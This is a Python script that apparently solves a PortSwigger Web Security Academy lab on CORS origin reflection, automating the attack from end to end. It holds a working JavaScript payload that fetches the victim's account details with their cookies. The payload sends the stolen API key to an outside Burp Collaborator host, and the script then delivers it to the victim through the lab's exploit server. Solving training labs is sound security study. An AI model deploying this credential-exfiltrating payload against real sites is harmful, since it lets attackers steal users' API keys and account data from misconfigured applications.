import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
from string import Template

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
# author: 0xyf


class CORS1:
    def __init__(self):
        self.lab_id = "0a75009e0409ba0081624870003b0070"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.collab_url = "https://onfz8ylfwywlwmqsqdejlgvqqhwdk7bv0.oastify.com"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.chg_email_url = f"{self.url}/my-account/change-email"
        self.api_url = f"{self.url}/accountDetails"

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def get_submit_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        submit_path = soup.find("button", id="submitSolution").get("path")
        self.submit_url = f"{self.url}{submit_path}"

    def execute_request(self, data):
        r = requests.post(
            f"{self.exploit_srv_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def cors(self):
        self.get_exploit_srv_url()
        payload = Template(
            """<script>
            fetch('$api_url', { credentials: 'include' })
            .then(r => r.json())
            .then(j => {
                fetch('$collab_url/?api_key=' + encodeURIComponent(j.apikey));
            });
            </script>"""
        )
        payload = payload.substitute(api_url=self.api_url, collab_url=self.collab_url)
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = self.execute_request(data)

    def submit_api_key(self):
        self.get_submit_url()
        api_key = input("Enter API Key from collaborator: /?api_key=<here> ")
        print("[+] submitting key")
        data = {"answer": api_key}
        r = requests.post(
            self.submit_url,
            data=data,
            proxies=self.proxies,
            verify=False,
        )

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.cors()
        self.submit_api_key()
        self.check_solved()


def main():
    CORS1().solve()


if __name__ == "__main__":
    main()
